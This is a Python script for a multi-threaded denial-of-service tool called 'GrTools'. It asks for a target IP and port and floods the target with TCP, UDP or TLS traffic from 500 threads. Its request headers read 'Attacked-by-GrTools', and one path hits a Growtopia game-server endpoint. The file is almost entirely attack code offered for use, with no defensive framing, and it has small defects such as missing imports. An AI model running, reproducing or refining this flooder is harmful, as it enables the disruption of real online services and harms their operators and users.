import socket
import random
import datetime
import threading
import ssl

expiration_date = datetime.datetime.now() + datetime.timedelta(days=7)

def is_account_expired():
    current_date = datetime.datetime.now()
    if current_date > expiration_date:
        return True
    else:
        return False

tampilan = """
╔═══╦═══╗    ╔════╦═══╦═══╦╗──╔═══╗
║╔═╗║╔═╗║    ║╔╗╔╗║╔═╗║╔═╗║║──║╔═╗║
║║─╚╣╚═╝║    ╚╝║║╚╣║─║║║─║║║──║╚══╗
║║╔═╣╔╗╔╝      ║║─║║─║║║─║║║─╔╬══╗║
║╚╩═║║║╚╗      ║║─║╚═╝║╚═╝║╚═╝║╚═╝║
╚═══╩╝╚═╝      ╚╝─╚═══╩═══╩═══╩═══╝
"""
print(tampilan)

ip = input("GRC2@root~# Enter Target IP : ")
port = int(input("GRC2@root~# Enter Target PORT : "))
times = int(input("GRC2@root~# Enter TIME : "))

print("""
    ┌────────────────────────────────────┐
    │          GrTools Methods           │            
    │  [+] TCP                           │           
    │  [+] UDP                           │          
    │  [+] TLS                           │                                                                                   
    │  [+] TCP-X (SOON)                  │            
    └────────────────────────────────────┘
   ┌───────────────────────────────────────┐
       Copyright  GrTools Plan Lifetime       
   └───────────────────────────────────────┘
""")

method = input("GRC2@root~# Enter METHOD : ")
if method not in ["UDP", "TCP", "TLS"]:
    print("METHOD INVALID!")
    sys.exit(1)

def Headers():
    header = ""
    post_host = "POST /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
    connection = "Connection: Keep-Alive\r\n"
    content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
    connection += "Cache-Control: max-age=0\r\n"
    connection += "pragma: no-cache\r\n"
    randomip = str(random.randint(1,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
    forward = "X-Forwarded-For: 1\r\n"
    forward += "Client-IP: 10000\r\n"
    length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
    header = post_host + forward + content + connection + length + "\r\n\r\n"
    return header

def tcpfl():
    grtools = os.urandom(15419) + os.urandom(60404)
    while datetime.datetime.now() < expiration_date:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(grtools)
            print(f"Sending Packet to > ip : {ip} port : {port} | with time => {times} with Method TCP Flood ")
            sock.close()
        except Exception as e:
            print(e)

def udpby():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((ip, port))

    udpfloodl = os.urandom(10024)
    while datetime.datetime.now() < expiration_date:
        get_host = "GET /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + Headers() + "\r\n"
        try:
            s.sendto(udpfloodl, (ip, port))
            print(f"Sending Packet to > ip : {ip} port : {port} | with time => {times} with Method UDP Flood ")
        except socket.error as e:
            print(e)
    s.close()

def httpfl():
    while datetime.datetime.now() < expiration_date:
        try:
            context = ssl.create_default_context()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ssl_sock = context.wrap_socket(sock)
            ssl_sock.connect((ip, 443))

            get_host = "GET /growtopia/server_data.php HTTP/1.1\r\nHost: " + ip + "\r\n"
            http_request = b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"

            for x in range(times):
                ssl_sock.send(http_request)

            print(f"Sending Packet to > ip : {ip} port : 443 | with time => {times} with Method HTTP Flood ")
            ssl_sock.close()
        except Exception as e:
            print(e)

threads = []
for _ in range(500):
    if method == "TCP":
        t = threading.Thread(target=tcpfl)
    elif method == "UDP":
        t = threading.Thread(target=udpby)
    elif method == "TLS":
        t = threading.Thread(target=httpfl)
    threads.append(t)
    t.start()

for thread in threads:
    thread.join()
